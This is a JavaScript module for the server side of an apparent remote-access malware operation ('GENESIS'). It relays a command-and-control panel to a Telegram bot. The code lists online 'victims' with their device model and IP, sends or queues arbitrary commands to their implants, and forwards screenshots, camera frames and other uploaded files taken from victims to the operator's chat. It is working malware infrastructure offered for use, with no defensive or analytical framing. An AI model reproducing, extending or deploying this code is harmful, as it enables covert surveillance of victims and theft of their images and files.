'use strict';
// GENESIS Telegram relay — zero-dependency long-poll bridge between the C2 and
// a bot account. Operator chat commands route through the SAME queue/delivery
// machinery as the panel; events and small uploads stream out to subscribed
// builds. Snapshots (.rgbaf) are converted to PNG here (zlib CRC manual table,
// no deps) and pushed as photos, JPEG camera frames as-is.
//
// Enable in config.json:
//   "tg": { "token": "<bot token from @BotFather>", "adminChat": "<your chat id>" }
// An empty/absent token disables the relay entirely.

const zlib = require('zlib');

let state = null; // { token, adminChat, subs:Set, offset, lastEvent:Map }
let deps = null;  // { log, sessions, readPending, writePending, victims }

const CRC_TABLE = (() => {
  const t = new Int32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = (c & 1) ? (0xedb88320 ^ (c >>> 1)) : (c >>> 1);
    t[n] = c;
  }
  return t;
})();

function crc32(buf) {
  let c = 0xffffffff;
  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

// ── outbound helpers ──────────────────────────────────────────────────────

async function tgSend(chatId, text) {
  if (!state) return;
  try {
    await fetch(`https://api.telegram.org/bot${state.token}/sendMessage`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: String(text).slice(0, 3900) }),
    });
  } catch (_) {}
}

async function tgPhoto(chatId, buf, caption) {
  if (!state) return;
  try {
    const fd = new FormData();
    fd.append('chat_id', String(chatId));
    fd.append('caption', String(caption || '').slice(0, 900));
    fd.append('photo', new Blob([buf]), 'frame.jpg');
    await fetch(`https://api.telegram.org/bot${state.token}/sendPhoto`, { method: 'POST', body: fd });
  } catch (_) {}
}

async function tgFile(chatId, buf, name) {
  if (!state) return;
  try {
    const fd = new FormData();
    fd.append('chat_id', String(chatId));
    fd.append('document', new Blob([buf]), name);
    await fetch(`https://api.telegram.org/bot${state.token}/sendDocument`, { method: 'POST', body: fd });
  } catch (_) {}
}

// ── RGBA → PNG (filter-0 scanlines + deflate) ─────────────────────────────

function rgbaToPng(buf) {
  if (buf.length < 12 || buf.toString('ascii', 0, 4) !== 'GRG1') return null;
  const w = buf.readUInt32BE(4);
  const h = buf.readUInt32BE(8);
  const px = buf.subarray(12);
  if (px.length < w * h * 4 || w === 0 || h === 0 || w > 8192 || h > 8192) return null;
  const stride = w * 4;
  const raw = Buffer.alloc((stride + 1) * h);
  for (let y = 0; y < h; y++) {
    raw[y * (stride + 1)] = 0; // filter: none
    px.copy(raw, y * (stride + 1) + 1, y * stride, y * stride + stride);
  }
  const idat = zlib.deflateSync(raw);

  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0);
  ihdr.writeUInt32BE(h, 4);
  ihdr[8] = 8;  // bit depth
  ihdr[9] = 6;  // color type: RGBA

  const chunk = (type, data) => {
    const t = Buffer.from(type, 'ascii');
    const len = Buffer.alloc(4);
    len.writeUInt32BE(data.length, 0);
    const body = Buffer.concat([t, data]);
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(crc32(body), 0);
    return Buffer.concat([len, body, crc]);
  };

  const sig = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  return Buffer.concat([sig, chunk('IHDR', ihdr), chunk('IDAT', idat), chunk('IEND', Buffer.alloc(0))]);
}

// ── commands → victim queue/delivery (mirror of routeOperator 'cmd') ──────

function deliverCmd(vid, cmd) {
  const c = deps.sessions.get(vid);
  if (c) {
    c.send({ t: 'cmd', id: cmd.id, op: cmd.op, args: cmd.args || {} });
    return { delivered: true, queued: false };
  }
  const [buildId] = String(vid).split(':');
  const pending = deps.readPending(buildId, vid);
  pending.push({ id: cmd.id, op: cmd.op, args: cmd.args || {}, at: Date.now() });
  deps.writePending(buildId, vid, pending);
  return { delivered: false, queued: true };
}

// ── message handling (admin chat only) ────────────────────────────────────

function helpText() {
  return [
    '/start  this list',
    '/id  echo this chat id',
    '/sub <buildId>  stream events for a build here',
    '/unsub <buildId>  stop streaming',
    '/subs  current subscriptions with online status',
    '/on  online victims',
    '/cmd <buildId:vid> <op> {"arg":"value"}  send a command',
    '/q <buildId:vid>  pending command count for a victim',
    '/stats  totals',
  ].join('\n');
}

function handleUpdate(u) {
  const m = (u.message || {}).text;
  const from = (u.message || {}).from || {};
  if (typeof m !== 'string' || String(from.id) !== state.adminChat) return;
  const chat = String(u.message.chat.id);
  const [cmd, ...rest] = m.trim().split(/\s+/);

  switch (cmd) {
    case '/start':
    case '/help':
      return tgSend(chat, helpText());
    case '/id':
      return tgSend(chat, 'chat id: ' + chat);
    case '/sub': {
      const b = rest[0];
      if (!b) return tgSend(chat, 'usage: /sub <buildId>');
      state.subs.add(b);
      return tgSend(chat, `subscribed to ${b} — events stream here`);
    }
    case '/unsub': {
      const b = rest[0];
      if (!b || !state.subs.delete(b)) return tgSend(chat, 'not subscribed (or no buildId given)');
      return tgSend(chat, `unsubscribed from ${b}`);
    }
    case '/subs': {
      const lines = [...state.subs].map((b) => {
        let online = 0;
        for (const [, c] of deps.sessions) if (c.session.kind === 'client' && c.session.buildId === b) online++;
        return `${b}: ${online} online`;
      });
      return tgSend(chat, lines.length ? lines.join('\n') : 'no subscriptions');
    }
    case '/on': {
      const lines = [];
      for (const [vid, c] of deps.sessions) {
        if (c.session.kind !== 'client') continue;
        const meta = (() => { try { return JSON.parse(deps.fs.readFileSync(deps.victimDir(c.session.buildId, vid) + '/meta.json', 'utf8')); } catch (_) { return {}; } })();
        lines.push(`${vid}  ${(meta.dev || {}).model || '?'} ${meta.ip || ''}`);
      }
      return tgSend(chat, lines.length ? lines.join('\n') : 'none online');
    }
    case '/cmd': {
      const vid = rest[0];
      const op = rest[1];
      if (!vid || !op) return tgSend(chat, 'usage: /cmd <buildId:vid> <op> {"arg":"v"}');
      let args = {};
      try { args = JSON.parse(rest.slice(2).join(' ') || '{}'); } catch (_) { return tgSend(chat, 'bad json args'); }
      const out = deliverCmd(vid, { id: 'tg-' + Date.now(), op, args });
      return tgSend(chat, `cmd ${op} → ${out.delivered ? 'delivered' : 'queued'} (${vid})`);
    }
    case '/q': {
      const vid = rest[0];
      if (!vid) return tgSend(chat, 'usage: /q <buildId:vid>');
      const [buildId] = String(vid).split(':');
      const n = deps.readPending(buildId, vid).length;
      return tgSend(chat, `${vid}: ${n} pending`);
    }
    case '/stats': {
      let online = 0;
      for (const [, c] of deps.sessions) if (c.session.kind === 'client') online++;
      return tgSend(chat, `online ${online} · total ${deps.victims().length} · uptime ${Math.floor(process.uptime())}s`);
    }
    default:
      return tgSend(chat, 'unknown — try /help');
  }
}

// ── long poll loop ────────────────────────────────────────────────────────

async function poll() {
  if (!state) return;
  try {
    const url = `https://api.telegram.org/bot${state.token}/getUpdates?offset=${state.offset}&timeout=25`;
    const r = await fetch(url);
    const j = await r.json();
    if (j.ok && Array.isArray(j.result)) {
      for (const u of j.result) {
        state.offset = u.update_id + 1;
        handleUpdate(u);
      }
    }
  } catch (_) {}
  setTimeout(poll, 1000);
}

// ── public surface ────────────────────────────────────────────────────────

const api = {
  get enabled() { return state !== null; },
  get subs() { return state ? state.subs : new Set(); },

  // event → subscribed admins, coalesced (same cat+vid+data within 6s is dropped)
  pumpEvent(buildId, vid, cat, data) {
    if (!state) return;
    if (!state.subs.has(buildId) && !state.subs.has('*')) return;
    const key = `${buildId}/${vid}/${cat}/` + String(data || '');
    const now = Date.now();
    const last = state.lastEvent.get(key);
    if (last && now - last < 6000) return;
    state.lastEvent.set(key, now);
    const t = new Date(now).toISOString().slice(11, 19);
    const frag = typeof data === 'string' ? data : JSON.stringify(data || '');
    tgSend(state.adminChat, `[${t}] ${buildId}/${String(vid).split(':')[1] || vid} ${cat}\n${frag.slice(0, 1900)}`);
  },

  // upload → photo/document, converted when RGBA
  pumpUpload(buildId, vid, rel, buf) {
    if (!state) return;
    if (!state.subs.has(buildId) && !state.subs.has('*')) return;
    const name = String(rel).split(/[\\/]/).pop() || rel;
    const cap = `${buildId}/${String(vid).split(':')[1] || vid} ${name}`;
    if (rel.endsWith('.rgbaf')) {
      const png = rgbaToPng(buf);
      if (png && png.length <= 9 * 1024 * 1024) return tgPhoto(state.adminChat, png, cap + ' (screen)');
      return tgSend(state.adminChat, `${cap} — rgba ${(buf.length / 1024).toFixed(0)}KB (too big for photo)`);
    }
    if (rel.endsWith('.jpg') || rel.endsWith('.jpeg')) {
      if (buf.length <= 9 * 1024 * 1024) return tgPhoto(state.adminChat, buf, cap);
    }
    if (buf.length <= 45 * 1024 * 1024) return tgFile(state.adminChat, buf, name);
    tgSend(state.adminChat, `${cap} — ${(buf.length / (1024 * 1024)).toFixed(1)}MB (skipped)`);
  },
};

function attachTelegram(cfg, d) {
  deps = d;
  const token = ((cfg.tg || {}).token || '').trim();
  const adminChat = String((cfg.tg || {}).adminChat || '').trim();
  if (!token || !adminChat) {
    d.log('telegram relay disabled (no tg.token / tg.adminChat)');
    return null;
  }
  state = { token, adminChat, subs: new Set(), offset: 0, lastEvent: new Map() };
  d.log(`telegram relay on → chat ${adminChat}`);
  setTimeout(poll, 1000);
  return api;
}

module.exports = { attachTelegram };